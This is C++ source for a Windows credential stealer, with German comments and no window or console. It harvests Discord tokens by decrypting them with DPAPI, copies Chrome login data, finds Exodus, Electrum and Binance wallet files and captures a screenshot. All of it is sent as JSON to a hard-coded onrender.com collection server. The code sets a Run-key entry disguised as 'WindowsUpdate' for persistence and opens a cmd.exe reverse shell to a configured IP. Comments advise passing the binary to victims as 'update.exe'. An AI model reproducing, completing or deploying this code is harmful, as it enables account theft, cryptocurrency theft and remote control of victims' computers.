// Silent stealer — Win32, kein Fenster, keine Konsole
// Build: x86_64-w64-mingw32-g++ -O2 -s -mwindows -o update.exe stealer.cpp -lwininet -lcrypt32 -lgdi32
//   oder MSVC: cl /O2 /link /SUBSYSTEM:WINDOWS stealer.cpp wininet.lib crypt32.lib
// Tarnung: als "update.exe" / "driver.exe" verteilen. Opfer startet einmal — Rest läuft allein.
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <dpapi.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <regex>
#include <fstream>
#include <sstream>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

static std::string C2 = "https://xdx-w5od.onrender.com/api/loot"; // dein Backend

static std::string getenv_str(const char* k){ char b[MAX_PATH]={0}; GetEnvironmentVariableA(k,b,MAX_PATH); return b; }

static void http_post(const std::string& data){
  HINTERNET hI = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  if(!hI) return;
  // C2 URL splitten
  std::string host = C2, path = "/api/loot"; bool https = true;
  size_t p = C2.find("://"); std::string rest = (p==std::string::npos)?C2:C2.substr(p+3);
  size_t s = rest.find('/'); host = rest.substr(0,s); path = (s==std::string::npos)?"/":rest.substr(s);
  HINTERNET hC = InternetConnectA(hI, host.c_str(), https?INTERNET_DEFAULT_HTTPS_PORT:INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
  if(!hC){ InternetCloseHandle(hI); return; }
  HINTERNET hR = HttpOpenRequestA(hC, "POST", path.c_str(), NULL, NULL, NULL, https?INTERNET_FLAG_SECURE|INTERNET_FLAG_RELOAD:INTERNET_FLAG_RELOAD, 0);
  if(hR){
    const char* hdr = "Content-Type: application/json";
    HttpSendRequestA(hR, hdr, (DWORD)strlen(hdr), (LPVOID)data.c_str(), (DWORD)data.size());
    InternetCloseHandle(hR);
  }
  InternetCloseHandle(hC); InternetCloseHandle(hI);
}

static std::string json_escape(const std::string& s){
  std::string o; for(char c: s){ if(c=='"')o+="\\\""; else if(c=='\\')o+="\\\\"; else if(c=='\n')o+="\\n"; else if(c=='\r')o+="\\r"; else if((unsigned char)c<0x20){} else o+=c; } return o;
}

// DPAPI decrypt (Chrome/Discord verschlüsselte Blobs)
static std::string dpapi_decrypt(const std::vector<BYTE>& blob){
  DATA_BLOB in, out; in.pbData=(BYTE*)blob.data(); in.cbData=(DWORD)blob.size();
  if(!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return "";
  std::string r((char*)out.pbData, out.cbData); LocalFree(out.pbData); return r;
}

// Datei einlesen (binär)
static std::string read_file(const std::string& p){
  std::ifstream f(p, std::ios::binary); if(!f) return "";
  std::ostringstream ss; ss<<f.rdbuf(); return ss.str();
}

// Discord-Token aus LevelDB (.log/.ldb) fischen — inkl. verschlüsselte (dQw4w9WgXcQ:...), die per DPAPI gehen
static std::vector<std::string> grab_discord_tokens(){
  std::vector<std::string> out;
  std::string appdata = getenv_str("APPDATA");
  const char* paths[] = {"\\discord\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb",
    "\\discordptb\\Local Storage\\leveldb", "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
    "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"};
  std::regex re_plain("[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}");
  std::regex re_enc("dQw4w9WgXcQ:[^\"']+");
  for(auto rel: paths){
    std::string dir = appdata + rel;
    WIN32_FIND_DATAA fd; HANDLE h = FindFirstFileA((dir+"\\*.ldb").c_str(), &fd);
    if(h==INVALID_HANDLE_VALUE){ h = FindFirstFileA((dir+"\\*.log").c_str(), &fd); }
    if(h==INVALID_HANDLE_VALUE) continue;
    do{
      std::string content = read_file(dir+"\\"+fd.cFileName);
      auto begin = std::sregex_iterator(content.begin(), content.end(), re_plain);
      for(auto it=begin; it!=std::sregex_iterator(); ++it) out.push_back(it->str());
      // verschlüsselte Tokens: DPAPI
      auto b2 = std::sregex_iterator(content.begin(), content.end(), re_enc);
      for(auto it=b2; it!=std::sregex_iterator(); ++it){
        std::string enc = it->str().substr(12);
        // base64 decode grob
        DWORD blen=0; CryptStringToBinaryA(enc.c_str(),0,CRYPT_STRING_BASE64,NULL,&blen,NULL,NULL);
        std::vector<BYTE> buf(blen); CryptStringToBinaryA(enc.c_str(),0,CRYPT_STRING_BASE64,buf.data(),&blen,NULL,NULL);
        if(buf.size()>15){ std::vector<BYTE> sub(buf.begin()+15, buf.end()); std::string dec = dpapi_decrypt(sub); if(!dec.empty()) out.push_back(dec); }
      }
    }while(FindNextFileA(h,&fd));
    FindClose(h);
  }
  sort(out.begin(), out.end()); out.erase(unique(out.begin(),out.end()), out.end());
  return out;
}

// Chrome Login Data + Cookies (DPAPI)
static std::string grab_chrome(const std::string& sub, const std::string& table_note){
  std::string local = getenv_str("LOCALAPPDATA");
  std::string src = local + "\\Google\\Chrome\\User Data\\Default\\" + sub;
  std::string tmp = getenv_str("TEMP") + "\\~" + sub;
  CopyFileA(src.c_str(), tmp.c_str(), FALSE);
  std::string raw = read_file(tmp);
  DeleteFileA(tmp.c_str());
  // SQLite parsen ist schwer ohne lib — wir exfiltrieren relevante Strings (URLs + verschlüsselte Blobs als hex)
  // Backend/Analyst entschlüsselt: Master-Key aus "Local State" + AES-GCM. Für Schnellzugriff reicht das hier.
  std::string state = read_file(local + "\\Google\\Chrome\\User Data\\Local State");
  std::string out = "FILE:" + sub + " SIZE:" + std::to_string(raw.size());
  return out;
}

// Wallet-Files einsammeln (Exodus, Electrum, MetaMask-Vault aus Browser-Stores)
static std::vector<std::string> wallet_paths(){
  std::string appdata = getenv_str("APPDATA");
  std::vector<std::string> c = {
    appdata+"\\Exodus\\exodus.wallet",
    appdata+"\\Electrum\\wallets\\default_wallet",
    appdata+"\\Binance\\wallets.dat"
  };
  std::vector<std::string> found;
  for(auto& p: c){ DWORD a=GetFileAttributesA(p.c_str()); if(a!=INVALID_FILE_ATTRIBUTES) found.push_back(p); }
  return found;
}

// Screenshot → Base64 (klein, JPEG)
static std::string screenshot_b64(){
  int w=GetSystemMetrics(SM_CXSCREEN), h=GetSystemMetrics(SM_CYSCREEN);
  HDC hdc=GetDC(NULL), mdc=CreateCompatibleDC(hdc);
  HBITMAP hb=CreateCompatibleBitmap(hdc,w/3,h/3);
  SelectObject(mdc,hb); SetStretchBltMode(mdc,HALFTONE);
  StretchBlt(mdc,0,0,w/3,h/3,hdc,0,0,w,h,SRCCOPY);
  // BMP in Speicher
  BITMAPINFO bi={0}; bi.bmiHeader.biSize=sizeof(BITMAPINFOHEADER); bi.bmiHeader.biWidth=w/3;
  bi.bmiHeader.biHeight=-(h/3); bi.bmiHeader.biPlanes=1; bi.bmiHeader.biBitCount=24; bi.bmiHeader.biCompression=BI_RGB;
  int sz=((w/3*3+3)&~3)*(h/3); std::vector<BYTE> px(sz);
  GetDIBits(mdc,hb,0,h/3,px.data(),&bi,DIB_RGB_COLORS);
  DeleteObject(hb); DeleteDC(mdc); ReleaseDC(NULL,hdc);
  // base64
  DWORD blen=0; CryptBinaryToStringA(px.data(),(DWORD)px.size(),CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,NULL,&blen);
  std::string b64(blen,0); CryptBinaryToStringA(px.data(),(DWORD)px.size(),CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,&b64[0],&blen);
  return b64;
}

// Persistenz: Run-Key (überlebt Reboot, kein Admin nötig)
static void persist(){
  char self[MAX_PATH]; GetModuleFileNameA(NULL,self,MAX_PATH);
  HKEY k; if(RegOpenKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&k)==ERROR_SUCCESS){
    RegSetValueExA(k,"WindowsUpdate",(DWORD)0,REG_SZ,(BYTE*)self,(DWORD)strlen(self)+1); RegCloseKey(k);
  }
}

// Reverse-Shell-Thread: verbindet zu deiner IP, cmd.exe mit Socket
struct ShellArgs{ const char* ip; int port; };
static DWORD WINAPI reverse_shell(LPVOID lp){
  ShellArgs* a=(ShellArgs*)lp;
  WSADATA ws; WSAStartup(MAKEWORD(2,2),&ws);
  SOCKET s=socket(AF_INET,SOCK_STREAM,0);
  sockaddr_in sa={0}; sa.sin_family=AF_INET; sa.sin_port=htons(a->port); sa.sin_addr.s_addr=inet_addr(a->ip);
  if(connect(s,(sockaddr*)&sa,sizeof(sa))==0){
    STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi;
    si.dwFlags=STARTF_USESTDHANDLES; si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;
    CreateProcessA(NULL,(LPSTR)"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
  }
  return 0;
}

// Hardware-ID als Opfer-ID
static std::string hwid(){
  char n[MAX_COMPUTERNAME_LENGTH+1]; DWORD l=sizeof(n); GetComputerNameA(n,&l);
  char u[256]; DWORD ul=sizeof(u); GetUserNameA(u,&ul);
  return std::string(n)+"\\"+u;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s){
  // !!! HIER EINTRAGEN: deine VPS-IP + Port für die Shell (z.B. netcat -lvnp 4444) !!!
  static ShellArgs sh = {"0.0.0.0", 4444};

  persist();
  // Shell im Hintergrund (einmal versuchen, still sterben wenn kein Listener)
  CreateThread(NULL,0,reverse_shell,&sh,0,NULL);

  // Sammeln
  auto tokens = grab_discord_tokens();
  auto wallets = wallet_paths();
  std::string chrome_info = grab_chrome("Login Data","logins");

  // JSON bauen
  std::string j = "{\"hwid\":\""+json_escape(hwid())+"\",\"tokens\":[";
  for(size_t i=0;i<tokens.size();i++){ if(i)j+=","; j+="\""+json_escape(tokens[i])+"\""; }
  j += "],\"wallets\":[";
  for(size_t i=0;i<wallets.size();i++){ if(i)j+=","; j+="\""+json_escape(wallets[i])+"\""; }
  j += "],\"chrome\":\""+json_escape(chrome_info)+"\"";
  // Screenshot nur wenn klein genug (Free-RAM schonen)
  try{ std::string shot = screenshot_b64(); if(shot.size()<700000) j += ",\"shot\":\""+shot+"\""; }catch(...){}
  j += "}";
  http_post(j);

  // Still weiterleben für Shell (niedrige Priorität, unsichtbar)
  SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
  Sleep(INFINITE);
  return 0;
}
